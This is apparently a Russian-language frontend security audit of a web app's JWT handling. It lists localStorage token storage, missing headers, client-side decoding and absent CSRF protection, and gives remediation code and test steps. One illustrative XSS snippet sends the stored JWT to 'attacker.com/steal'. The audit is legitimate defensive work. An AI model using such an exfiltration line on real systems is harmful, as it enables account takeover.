# Security Audit - Frontend Token Storage

> **Дата:** 2025-12-06  
> **Задача:** CQST-008  
> **Статус:** Найдены критические уязвимости

## 🔴 Критические уязвимости

### 1. JWT в localStorage → XSS риск

**Файл:** `frontend/web/src/shared/api.ts:22-26, 216-226, 258`

**Проблема:**
```typescript
// Токен доступен любому JS коду на странице
localStorage.getItem('jwt_token');
localStorage.setItem('jwt_token', response.token);
```

**XSS сценарий:**
```javascript
// Злоумышленник через XSS может украсть токен:
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: localStorage.getItem('jwt_token')
});
```

**Риск:** Полная компрометация аккаунта пользователя

---

### 2. Отсутствие Security Headers

**Файл:** `docker/nginx/conf.d/default.conf`

**Отсутствуют:**
- ❌ Content-Security-Policy
- ❌ X-Frame-Options
- ❌ X-Content-Type-Options
- ❌ X-XSS-Protection
- ❌ Referrer-Policy
- ❌ Strict-Transport-Security

**Риски:**
- XSS атаки
- Clickjacking
- MIME type confusion
- Утечка referrer данных

---

### 3. Декодирование JWT на клиенте

**Файл:** `frontend/web/src/shared/api.ts:228-239, 265-285`

**Проблема:**
```typescript
// Данные пользователя извлекаются из токена на клиенте
const payload = jwtDecode(response.token);
const user = {
  id: payload.sub || payload.user_id,
  email: payload.email,
  // ...
};
```

**Риск:** 
- JWT signature проверяется только на backend
- Клиент доверяет невалидированным данным
- Можно подделать локальный токен для UI манипуляций

**Решение:** Backend должен возвращать `user` объект отдельно

---

### 4. Отсутствие CSRF защиты

**Файлы:** Все API запросы

**Проблема:** При миграции на cookies необходима CSRF защита для мутирующих операций

**Риск:** Cross-Site Request Forgery атаки

---

## ✅ Рекомендации по приоритетам

### 🎯 Приоритет 1: Немедленно (1-2 дня)

#### A. Security Headers в Nginx

```nginx
# docker/nginx/conf.d/default.conf
server {
    # Базовые защитные заголовки
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Content Security Policy
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none';" always;
}
```

#### B. CSP Meta Tag (временная мера)

```html
<!-- frontend/web/index.html -->
<meta 
  http-equiv="Content-Security-Policy" 
  content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self';"
>
```

**Эффект:** Защита от XSS, Clickjacking, MIME sniffing  
**Время:** ~30 минут  
**Риск:** Низкий (только добавление заголовков)

---

### 🎯 Приоритет 2: Краткосрочно (1-2 недели)

#### HttpOnly Cookies Migration

**Backend изменения:**

```yaml
# project/config/packages/lexik_jwt_authentication.yaml
lexik_jwt_authentication:
    token_extractors:
        cookie:
            enabled: true
            name: jwt_token
    set_cookies:
        jwt_token:
            lifetime: 3600        # 1 час
            samesite: strict
            path: /
            domain: null
            secure: false         # true для production с HTTPS
            httponly: true        # КРИТИЧНО!
```

**Backend response:**

```php
// Вернуть user объект в ответе на login
return new JsonResponse([
    'token' => $token,  // Будет в cookie автоматически
    'user' => [
        'id' => $user->getId(),
        'username' => $user->getUsername(),
        'email' => $user->getEmail(),
    ]
]);
```

**Frontend изменения:**

```typescript
// frontend/web/src/shared/api.ts

// 1. Убрать сохранение в localStorage
login: async (data: LoginData): Promise<AuthResponse> => {
  const response = await apiRequest('/auth/login', {
    method: 'POST',
    credentials: 'include',  // ВАЖНО: отправка cookies
    body: JSON.stringify(data),
  });
  
  // НЕ сохраняем токен - он в HttpOnly cookie
  // localStorage.setItem('jwt_token', response.token); ❌
  
  return response; // user приходит с backend
}

// 2. Убрать чтение из localStorage
async function apiRequest<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  // const token = localStorage.getItem('jwt_token'); ❌
  
  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    // Токен в cookie - не нужен Authorization header
    ...options.headers,
  };

  const response = await fetch(url, {
    ...options,
    credentials: 'include',  // ВАЖНО: для отправки cookies
    headers,
  });
  
  // ...
}

// 3. Убрать декодирование JWT
getCurrentUser: async (): Promise<User | null> => {
  try {
    // Просто запросить у backend - токен в cookie
    const response = await apiRequest<{ data: { user: User } }>('/auth/me', {
      credentials: 'include'
    });
    return response.data.user;
  } catch (error) {
    return null;
  }
}
```

**Новый endpoint (backend):**

```php
// GET /api/auth/me - получить текущего пользователя
#[Route('/api/auth/me', methods: ['GET'])]
public function getCurrentUser(): JsonResponse
{
    $user = $this->getUser();
    
    if (!$user) {
        return new JsonResponse(['error' => 'Unauthorized'], 401);
    }
    
    return new JsonResponse([
        'data' => [
            'user' => [
                'id' => $user->getId(),
                'username' => $user->getUsername(),
                'email' => $user->getEmail(),
            ]
        ]
    ]);
}
```

**CORS изменения:**

```yaml
# project/config/packages/nelmio_cors.yaml
nelmio_cors:
    paths:
        '^/api/':
            allow_credentials: true  # КРИТИЧНО для cookies
            allow_origin: ['http://cityquest.test', 'http://localhost:5173']
            allow_headers: ['Content-Type', 'Authorization', 'X-CSRF-Token']
            allow_methods: ['GET', 'POST', 'PATCH', 'DELETE', 'OPTIONS']
            max_age: 3600
```

**Эффект:** Защита от XSS кражи токенов  
**Время:** ~4-6 часов (backend + frontend + тесты)  
**Риск:** Средний (требует тщательного тестирования)

---

### 🎯 Приоритет 3: Среднесрочно (2-4 недели)

#### Refresh Token Mechanism

**Архитектура:**
- Access Token: 15 минут (в HttpOnly cookie)
- Refresh Token: 7 дней (в отдельном HttpOnly cookie)
- Автообновление за 1 минуту до истечения

**Backend:**

```php
// Entity: RefreshToken
class RefreshToken {
    private string $id;
    private User $user;
    private string $token;
    private \DateTimeInterface $expiresAt;
}

// POST /api/auth/refresh
public function refresh(Request $request): JsonResponse
{
    $refreshToken = $request->cookies->get('refresh_token');
    
    // Валидация refresh token
    // Выдача нового access token
    // Обновление refresh token (rotation)
}
```

**Frontend:**

```typescript
// Автоматическое обновление токена
let refreshTimer: NodeJS.Timeout;

function scheduleTokenRefresh(expiresIn: number) {
  clearTimeout(refreshTimer);
  
  // Обновить за 1 минуту до истечения
  const refreshTime = (expiresIn - 60) * 1000;
  
  refreshTimer = setTimeout(async () => {
    await api.refreshToken();
  }, refreshTime);
}
```

**Эффект:** 
- Короткий TTL access token → минимальное окно атаки
- Refresh token rotation → защита от replay атак
- Автоматическое продление сессии

**Время:** ~8-10 часов  
**Риск:** Средний (сложная логика, edge cases)

---

### 🎯 Приоритет 4: Долгосрочно (1-2 месяца)

#### CSRF Protection

**Backend:**

```php
// Генерация CSRF токена
#[Route('/api/csrf-token', methods: ['GET'])]
public function getCsrfToken(): JsonResponse
{
    $token = bin2hex(random_bytes(32));
    $this->session->set('csrf_token', $token);
    
    return new JsonResponse(['csrfToken' => $token]);
}

// Валидация в контроллерах
private function validateCsrf(Request $request): bool
{
    $token = $request->headers->get('X-CSRF-Token');
    $sessionToken = $this->session->get('csrf_token');
    
    return hash_equals($sessionToken, $token);
}
```

**Frontend:**

```typescript
// Получение и хранение CSRF токена
let csrfToken: string | null = null;

async function initCsrf() {
  const response = await apiRequest<{ csrfToken: string }>('/csrf-token');
  csrfToken = response.csrfToken;
}

// Добавление в мутирующие запросы
async function apiRequest<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    ...options.headers,
  };
  
  // Добавить CSRF для POST/PATCH/DELETE
  if (['POST', 'PATCH', 'DELETE'].includes(options.method || '')) {
    if (csrfToken) {
      headers['X-CSRF-Token'] = csrfToken;
    }
  }
  
  // ...
}
```

**Эффект:** Защита от CSRF атак  
**Время:** ~6-8 часов  
**Риск:** Низкий-Средний

---

## 📊 Сравнение безопасности

| Аспект | До улучшений | После улучшений |
|--------|--------------|-----------------|
| **XSS → Token theft** | 🔴 Критический | 🟢 Защищено (HttpOnly) |
| **CSRF** | 🟠 Уязвимо | 🟢 Защищено (CSRF Token) |
| **Clickjacking** | 🟠 Уязвимо | 🟢 Защищено (X-Frame-Options) |
| **MIME Sniffing** | 🟡 Риск | 🟢 Защищено (X-Content-Type) |
| **Token Lifetime** | 🟡 1 час | 🟢 15 минут + Refresh |
| **Security Headers** | 🔴 0/6 | 🟢 6/6 |

---

## 🧪 План тестирования

### Фаза 1: Security Headers
```bash
# Проверка заголовков
curl -I http://cityquest.test | grep -E "X-Frame|X-Content|CSP"

# Browser DevTools → Network → Response Headers
```

### Фаза 2: HttpOnly Cookies
```bash
# 1. Login
curl -c cookies.txt -X POST http://cityquest.test/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"pass"}'

# 2. Проверить cookie HttpOnly
cat cookies.txt | grep jwt_token

# 3. Защищенный запрос
curl -b cookies.txt http://cityquest.test/api/user/progress
```

### Фаза 3: XSS тест
```javascript
// Console в браузере - должен вернуть null/undefined
localStorage.getItem('jwt_token')
document.cookie // не должен содержать jwt_token
```

---

## 📚 Связанные документы

- **Задача:** `memory-bank/tasks.md` → CQST-008
- **Auth Reference:** `memory-bank/auth-reference.md`
- **Tech Context:** `memory-bank/techContext.md`
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/

---

**Дата создания:** 2025-12-06  
**Автор:** Security Audit  
**Статус:** 🔴 Критические уязвимости найдены

